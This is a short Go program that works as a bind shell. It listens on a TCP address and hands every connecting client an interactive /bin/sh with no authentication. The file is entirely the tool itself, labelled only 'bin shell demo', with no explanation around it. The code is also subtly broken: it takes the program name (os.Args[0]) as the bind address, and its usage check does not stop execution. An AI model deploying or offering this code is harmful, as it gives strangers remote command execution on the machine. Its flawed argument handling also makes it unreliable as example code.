package main

import (
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	var addr string
	if len(os.Args) != 2 {
		log.Println("Usage: " + os.Args[0] + " <bindAddress>")
		log.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")
	}

	addr = os.Args[0]

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Fatal("Accepting connection err: ", err)
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	var shell = "/bin/sh"
	_, _ = conn.Write([]byte("bin shell demo\n"))
	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = conn
	command.Stderr = conn
	command.Stdout = conn
	_ = command.Run()
}